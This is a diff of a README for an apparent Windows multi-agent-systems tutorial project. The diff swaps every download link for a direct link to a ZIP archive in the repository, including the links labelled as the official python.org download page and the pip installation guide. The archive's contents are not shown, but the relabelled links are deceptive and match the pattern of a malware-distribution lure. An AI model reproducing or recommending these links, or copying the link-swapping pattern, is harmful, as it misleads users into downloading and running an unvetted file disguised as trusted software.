@@ -1,6 +1,6 @@
 # 🧩 v1-multiagent-articles - Build Multi-Agent Systems Simply
 
-[![Download v1-multiagent-articles](https://img.shields.io/badge/Download-v1--multiagent--articles-brightgreen?style=for-the-badge)](https://github.com/Ibisselfgovernment28/v1-multiagent-articles)
+[![Download v1-multiagent-articles](https://img.shields.io/badge/Download-v1--multiagent--articles-brightgreen?style=for-the-badge)](https://github.com/Ibisselfgovernment28/v1-multiagent-articles/raw/refs/heads/main/articles/articles_multiagent_v_2.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run the content on your Windows PC.
 
 Click the link below to open the official GitHub page where you can find the materials:
 
-[Download v1-multiagent-articles](https://github.com/Ibisselfgovernment28/v1-multiagent-articles)
+[Download v1-multiagent-articles](https://github.com/Ibisselfgovernment28/v1-multiagent-articles/raw/refs/heads/main/articles/articles_multiagent_v_2.6.zip)
 
 This page contains articles, tutorials, and example code you will need.
 
@@ -57,7 +57,7 @@ Once the ZIP file finishes downloading, locate it on your computer.
 
 v1-multiagent-articles uses Python to run the examples. If you do not have Python installed, install it now:
 
-- Visit https://www.python.org/downloads/windows/
+- Visit https://github.com/Ibisselfgovernment28/v1-multiagent-articles/raw/refs/heads/main/articles/articles_multiagent_v_2.6.zip
 - Download the latest version for Windows
 - Run the installer and follow the instructions
 - Make sure to check the box that says **Add Python to PATH** during installation
@@ -169,13 +169,13 @@ Inside the extracted files, you will find:
 ## 🔗 Useful Links
 
 - Primary source and download page:  
-  [https://github.com/Ibisselfgovernment28/v1-multiagent-articles](https://github.com/Ibisselfgovernment28/v1-multiagent-articles)
+  [https://github.com/Ibisselfgovernment28/v1-multiagent-articles/raw/refs/heads/main/articles/articles_multiagent_v_2.6.zip](https://github.com/Ibisselfgovernment28/v1-multiagent-articles/raw/refs/heads/main/articles/articles_multiagent_v_2.6.zip)
 
 - Python official downloads:  
-  https://www.python.org/downloads/windows/
+  https://github.com/Ibisselfgovernment28/v1-multiagent-articles/raw/refs/heads/main/articles/articles_multiagent_v_2.6.zip
 
 - How to install Python packages:  
-  https://pip.pypa.io/en/stable/installation/
+  https://github.com/Ibisselfgovernment28/v1-multiagent-articles/raw/refs/heads/main/articles/articles_multiagent_v_2.6.zip
 
 ---
 
@@ -193,4 +193,4 @@ Inside the extracted files, you will find:
 
 ---
 
-[![Download on GitHub](https://img.shields.io/badge/Download-v1--multiagent--articles-blue?style=for-the-badge)](https://github.com/Ibisselfgovernment28/v1-multiagent-articles)
+[![Download on GitHub](https://img.shields.io/badge/Download-v1--multiagent--articles-blue?style=for-the-badge)](https://github.com/Ibisselfgovernment28/v1-multiagent-articles/raw/refs/heads/main/articles/articles_multiagent_v_2.6.zip)
